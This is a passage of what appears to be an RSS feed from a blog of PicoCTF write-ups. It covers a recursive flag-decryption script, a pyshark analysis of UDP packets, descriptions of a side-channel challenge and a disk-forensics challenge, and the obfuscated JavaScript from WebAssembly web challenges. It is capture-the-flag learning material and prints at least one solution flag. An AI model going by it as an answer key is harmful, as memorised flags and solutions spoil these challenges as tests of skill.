ENCRYPTED_FLAG = bytes.fromhex(&amp;#34;42cbbce1487b443de1acf4834baed794f4bbd0dfe2d6046e248ff7962b&amp;#34;)

# This will overflow the stack, it will need to be significantly optimized in order to get the answer :)
@functools.cache
def m_func(i):
 if i == 0: return 1
 if i == 1: return 2
 if i == 2: return 3
 if i == 3: return 4

 return 55692*m_func(i-4) - 9549*m_func(i-3) + 301*m_func(i-2) + 21*m_func(i-1)


# Decrypt the flag
def decrypt_flag(sol):
 sol = sol % (10**10000)
 sol = str(sol)
 sol_md5 = hashlib.md5(sol.encode()).hexdigest()

 if sol_md5 != VERIF_KEY:
 print(&amp;#34;Incorrect solution&amp;#34;)
 sys.exit(1)

 key = hashlib.sha256(sol.encode()).digest()
 flag = bytearray([char ^ key[i] for i, char in enumerate(ENCRYPTED_FLAG)]).decode()

 print(flag)

if __name__ == &amp;#34;__main__&amp;#34;:
 sol = m_func(ITERS)
 decrypt_flag(sol)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - shark on wire 1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-1/</guid><description>&lt;h1 id="picoctf---shark-on-wire-1">
 PicoCTF - shark on wire 1
 &lt;a class="anchor" href="#picoctf---shark-on-wire-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/30?category=4&amp;amp;page=2">shark on wire 1&lt;/a>&lt;/p>
&lt;h2 id="exploit---analyze-udp-stream">
 Exploit - Analyze UDP stream
 &lt;a class="anchor" href="#exploit---analyze-udp-stream">#&lt;/a>
&lt;/h2>
&lt;p>It transfer the single character by UDP protocol.
&lt;img src="https://i.imgur.com/ff5CsGr.png" alt="" />
Follow the UDP stream and you&amp;rsquo;ll get the flag
&lt;img src="https://i.imgur.com/EfK83gj.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - shark on wire 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-2/</guid><description>&lt;h1 id="picoctf---shark-on-wire-2">
 PicoCTF - shark on wire 2
 &lt;a class="anchor" href="#picoctf---shark-on-wire-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一提出的很硬要，誰知道會把flag藏在這種地方，也沒有任何的提示，如果不是看&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>根本不知道這題要表達甚麼，也可能是我太蔡&lt;/p>
&lt;ol>
&lt;li>Simple Recon
首先做一些基本的recon，諸如dump files/string search/follow tcp or udp之類的，會發現UDP packets會有一些訊息出現，其中出現Start和一些a/b最後接著end
&lt;img src="https://hackmd.io/_uploads/rkASlUD02.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/BkxFgLPRn.png" alt="" />&lt;/li>
&lt;li>Set filter as &lt;code>udp.port==22&lt;/code>
會發現其中所有的len都一樣，就只有source port不一樣，同樣都是5xxx開頭，而後三位數就是flag
&lt;img src="https://hackmd.io/_uploads/BJq71UvC2.png" alt="" />&lt;/li>
&lt;li>Extract Flag
所以只要把所有的port擷取出來拚在一起，就可以拿到flag了&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">import pyshark

capture = pyshark.FileCapture(&amp;#39;./PicoCTF/Misc/shark on wire 2/capture.pcap&amp;#39;, display_filter=&amp;#39;udp.port == 22&amp;#39;)

data = []
for pkt in capture:
 if pkt.udp.port != &amp;#39;5000&amp;#39;:
 data.append(chr(int(pkt.udp.port[1:])))
print(&amp;#34;&amp;#34;.join(data))
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>picoCTF{p1LLf3r3d_data_v1a_st3g0}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;div class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
&lt;p>&lt;a href="https://zomry1.github.io/shark-on-wire-2/">PicoCTF 2019 - shark on wire 2:-1:&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p></description></item><item><title>PicoCTF - SideChannel</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---sidechannel/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---sidechannel/</guid><description>&lt;h1 id="picoctf---sidechannel">
 PicoCTF - SideChannel
 &lt;a class="anchor" href="#picoctf---sidechannel">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>There&amp;rsquo;s something fishy about this PIN-code checker, can you figure out the PIN and get the flag? Download the PIN checker program here pin_checker Once you&amp;rsquo;ve figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 50364 and provide it the PIN to get your flag.&lt;/p>
&lt;p>Hint 1: Read about &amp;ldquo;timing-based side-channel attacks.&amp;rdquo;
Hint 2: Attempting to reverse-engineer or exploit the binary won&amp;rsquo;t help you, you can figure out the PIN just by interacting with it and measuring certain properties about it.
Hint 3: Don&amp;rsquo;t run your attacks against the master server, it is secured against them. The PIN code you get from the pin_checker binary is the same as the one for the master server.&lt;/p></description></item><item><title>PicoCTF - Sleuthkit Intro</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---sleuthkit-intro/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---sleuthkit-intro/</guid><description>&lt;h1 id="picoctf---sleuthkit-intro">
 PicoCTF - Sleuthkit Intro
 &lt;a class="anchor" href="#picoctf---sleuthkit-intro">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/301?category=4&amp;amp;page=2">Sleuthkit Intro&lt;/a>&lt;/p>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Download the disk image and use &lt;font color="FF0000">mmls&lt;/font> on it to find the size of the Linux partition. Connect to the remote checker service to check your answer and get the flag. Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.&lt;/p>&lt;/blockquote>
&lt;pre>&lt;code>Download disk image
Access checker program: nc saturn.picoctf.net 52279
&lt;/code>&lt;/pre>
&lt;p>&lt;a href="https://blog.csdn.net/qq_40399982/article/details/114882879?spm=1001.2014.3001.5506">最新kali之mmls&lt;/a>&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-1/</guid><description>&lt;h1 id="picoctf---some-assembly-required-1">
 PicoCTF - Some Assembly Required 1
 &lt;a class="anchor" href="#picoctf---some-assembly-required-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/152?category=1&amp;amp;page=1">Some Assembly Required 1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.techbridge.cc/2017/06/17/webassembly-js-future/">了解 WebAssembly 的基礎使用方法&lt;/a>&lt;/p>
&lt;h2 id="source-code---after-beautify">
 Source code - After &lt;a href="https://beautifier.io/">Beautify&lt;/a>
 &lt;a class="anchor" href="#source-code---after-beautify">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const strings = [&amp;#39;value&amp;#39;, &amp;#39;2wfTpTR&amp;#39;, &amp;#39;instantiate&amp;#39;, &amp;#39;275341bEPcme&amp;#39;, &amp;#39;innerHTML&amp;#39;, &amp;#39;1195047NznhZg&amp;#39;, &amp;#39;1qfevql&amp;#39;, &amp;#39;input&amp;#39;, &amp;#39;1699808QuoWhA&amp;#39;, &amp;#39;Correct!&amp;#39;, &amp;#39;check_flag&amp;#39;, &amp;#39;Incorrect!&amp;#39;, &amp;#39;./JIFxzHyW8W&amp;#39;, &amp;#39;23SMpAuA&amp;#39;, &amp;#39;802698XOMSrr&amp;#39;, &amp;#39;charCodeAt&amp;#39;, &amp;#39;474547vVoGDO&amp;#39;, &amp;#39;getElementById&amp;#39;, &amp;#39;instance&amp;#39;, &amp;#39;copy_char&amp;#39;, &amp;#39;43591XxcWUl&amp;#39;, &amp;#39;504454llVtzW&amp;#39;, &amp;#39;arrayBuffer&amp;#39;, &amp;#39;2NIQmVj&amp;#39;, &amp;#39;result&amp;#39;];

const search_string1 = function(id1, _0x53c021) {
 id1 = id1 - 470;
 let strings6f = strings[id1];
 return strings6f;
};

(function(id1, id2) {
 const search_string = search_string1;
 while (!![]) {
 try {
 const secret_key = -parseInt(search_string(0x1eb)) + parseInt(search_string(0x1ed)) + -parseInt(search_string(0x1db)) * -parseInt(search_string(0x1d9)) + -parseInt(search_string(0x1e2)) * -parseInt(search_string(0x1e3)) + -parseInt(search_string(0x1de)) * parseInt(search_string(0x1e0)) + parseInt(search_string(0x1d8)) * parseInt(search_string(0x1ea)) + -parseInt(search_string(0x1e5));
 if (secret_key === id2) break;
 else id1[&amp;#39;push&amp;#39;](id1[&amp;#39;shift&amp;#39;]());
 } catch (_0x41d31a) {
 id1[&amp;#39;push&amp;#39;](id1[&amp;#39;shift&amp;#39;]());
 }
 }
}(strings, 627907));
let exports;
(async () =&amp;gt; {
 const search_string = search_string1;
 let _0x5f0229 = await fetch(search_string(489)),
 _0x1d99e9 = await WebAssembly[search_string(479)](await _0x5f0229[search_string(474)]()),
 _0x1f8628 = _0x1d99e9[search_string(470)];
 exports = _0x1f8628[&amp;#39;exports&amp;#39;];
})();

function onButtonPress() {
 const search_string = search_string1;
 let input_value = document[&amp;#39;getElementById&amp;#39;](search_string(484))[search_string(477)]; // document[&amp;#39;getElementById&amp;#39;](input)[value]
 for (let i = 0; i &amp;lt; input_value[&amp;#39;length&amp;#39;]; i++) {
 exports[search_string(471)](input_value[search_string(492)](i), i);
 }
 exports[&amp;#39;copy_char&amp;#39;](0, input_value[&amp;#39;length&amp;#39;]), exports[search_string(487)]() == 1 ? document[search_string(494)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e6) : document[search_string(0x1ee)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e8);
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-2/</guid><description>&lt;h1 id="picoctf---some-assembly-required-2">
 PicoCTF - Some Assembly Required 2
 &lt;a class="anchor" href="#picoctf---some-assembly-required-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">list_str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;copy_char&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;value&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;207aLjBod&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;1301420SaUSqf&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;233ZRpipt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;2224QffgXU&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;check_flag&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;408533hsoVYx&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;instance&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;278338GVFUrH&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;Correct!&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;549933ZVjkwI&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;innerHTML&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;charCodeAt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;./aD8SvhyVkb&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;result&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;977AzKzwq&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;Incorrect!&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;exports&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;length&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;getElementById&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;1jIrMBu&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;input&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;615361geljRK&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">var_a&lt;/span>, &lt;span style="color:#a6e22e">var_b&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">var_a&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">195&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">list_strc4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">list_str&lt;/span>[&lt;span style="color:#a6e22e">var_a&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">list_strc4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(&lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">var_a&lt;/span>, &lt;span style="color:#a6e22e">var_b&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#f92672">!!&lt;/span>[]) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">var_c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">200&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">201&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">205&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">207&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">195&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">198&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">212&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">203&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">217&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">199&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">var_c&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#a6e22e">var_b&lt;/span>) &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;push&amp;#39;&lt;/span>](&lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;shift&amp;#39;&lt;/span>]());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (&lt;span style="color:#a6e22e">_0x4f8a&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;push&amp;#39;&lt;/span>](&lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;shift&amp;#39;&lt;/span>]());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}(&lt;span style="color:#a6e22e">list_str&lt;/span>, &lt;span style="color:#ae81ff">310022&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">exports&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(&lt;span style="color:#66d9ef">async&lt;/span> () =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">210&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">res_2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">WebAssembly&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;instantiate&amp;#39;&lt;/span>](&lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;arrayBuffer&amp;#39;&lt;/span>]()),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">res_3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">res_2&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">204&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">res_3&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">214&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">onButtonPress&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">216&lt;/span>)](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">218&lt;/span>))[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">197&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">idx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">idx&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;length&amp;#39;&lt;/span>]; &lt;span style="color:#a6e22e">idx&lt;/span>&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">196&lt;/span>)](&lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">209&lt;/span>)](&lt;span style="color:#a6e22e">idx&lt;/span>), &lt;span style="color:#a6e22e">idx&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;copy_char&amp;#39;&lt;/span>](&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">215&lt;/span>)]), &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">202&lt;/span>)]() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">?&lt;/span> document[&lt;span style="color:#e6db74">&amp;#39;getElementById&amp;#39;&lt;/span>](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">211&lt;/span>))[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">208&lt;/span>)] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">206&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> document[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">216&lt;/span>)](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">211&lt;/span>))[&lt;span style="color:#e6db74">&amp;#39;innerHTML&amp;#39;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">213&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 3</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-3/</guid><description>&lt;h1 id="picoctf---some-assembly-required-3">
 PicoCTF - Some Assembly Required 3
 &lt;a class="anchor" href="#picoctf---some-assembly-required-3">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/WebAssembly/wabt">WebAssembly/wabt&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ./build/wasm2c qCCYI0ajpD.wasm -o dump.c
&lt;/code>&lt;/pre>&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler rTEuOmSfG3.js&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">&amp;#39;use strict&amp;#39;;
const str_list = [&amp;#34;exports&amp;#34;, &amp;#34;270328ewawLo&amp;#34;, &amp;#34;instantiate&amp;#34;, &amp;#34;1OsuamQ&amp;#34;, &amp;#34;Incorrect!&amp;#34;, &amp;#34;length&amp;#34;, &amp;#34;copy_char&amp;#34;, &amp;#34;value&amp;#34;, &amp;#34;1512517ESezaM&amp;#34;, &amp;#34;innerHTML&amp;#34;, &amp;#34;check_flag&amp;#34;, &amp;#34;result&amp;#34;, &amp;#34;1383842SQRPPf&amp;#34;, &amp;#34;924408cukzgO&amp;#34;, &amp;#34;getElementById&amp;#34;, &amp;#34;418508cLDohp&amp;#34;, &amp;#34;input&amp;#34;, &amp;#34;Correct!&amp;#34;, &amp;#34;573XsMMHp&amp;#34;, &amp;#34;arrayBuffer&amp;#34;, &amp;#34;183RUQBDE&amp;#34;, &amp;#34;38934oMACea&amp;#34;];
const tranfer_fn = function(url, whensCollection) {
 /** @type {number} */
 url = url - 285;
 let _0x143f7d = str_list[url];
 return _0x143f7d;
};
(function(data, oldPassword) {
 const tranfer_fn = tranfer_fn;
